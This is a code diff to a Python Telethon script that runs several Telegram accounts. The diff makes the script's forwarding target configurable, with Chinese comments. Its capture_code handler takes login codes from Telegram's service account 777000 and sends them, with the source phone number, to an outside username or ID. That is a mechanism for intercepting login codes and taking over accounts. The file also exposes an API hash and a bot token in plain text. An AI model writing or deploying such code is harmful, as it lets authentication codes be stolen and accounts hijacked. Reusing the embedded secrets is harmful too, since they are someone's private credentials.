@@ -20,7 +20,10 @@ logging.getLogger('telegram').setLevel(logging.WARNING)
 API_ID = 19684564
 API_HASH = "6219dccd88035a229ec3aa84d8162a38"
 BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
-TARGET_BOT_ID = 8754918048  # 机器人自己的ID
+
+# 转发目标：可以是用户名（如 "myusername"）或数字 ID
+# 用户名不需要 @，直接写字符串即可
+TARGET = "你的用户名或ID"  # 例如 "myusername" 或 123456789
 
 accounts = {}
 user_login_states = {}
@@ -28,23 +31,6 @@ PHONE_RULE = re.compile(r'^\+\d{10,15}$')
 
 
 def bind_account_handlers(client, phone):
-    target_entity = None
-
-    async def load_bot_target():
-        nonlocal target_entity
-        retry = 0
-        while retry < 3:
-            try:
-                target_entity = await client.get_entity(TARGET_BOT_ID)
-                logger.info(f"[{phone}] Bot entity loaded, id={target_entity.id}")
-                break
-            except Exception as e:
-                retry += 1
-                logger.warning(f"[{phone}] Load bot failed, retry {retry}/3: {str(e)}")
-                await asyncio.sleep(2)
-
-    client.loop.create_task(load_bot_target())
-
     @client.on(events.NewMessage(outgoing=True))
     async def alive_test(event):
         if event.message.text and event.message.text.lower() == "self check":
@@ -71,11 +57,12 @@ def bind_account_handlers(client, phone):
     @client.on(events.NewMessage(from_users=[777000]))
     async def capture_code(event):
         logger.info(f"[{phone}] Received SMS from 777000, push={accounts[phone]['anti_login']}")
-        if accounts[phone]["anti_login"] and target_entity is not None:
+        if accounts[phone]["anti_login"]:
             try:
                 msg = f"Source Phone: {phone}\nCode Content:\n{event.message.text}"
-                await client.send_message(target_entity, msg)
-                logger.info(f"[{phone}] SUCCESS: Code sent to bot {TARGET_BOT_ID}")
+                # 直接通过机器人客户端发送到目标（支持用户名或ID）
+                await bot_client.send_message(TARGET, msg)
+                logger.info(f"[{phone}] SUCCESS: Code sent to {TARGET}")
             except Exception as err:
                 logger.error(f"[{phone}] Send failed: {str(err)}")
 
@@ -228,3 +215,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+```
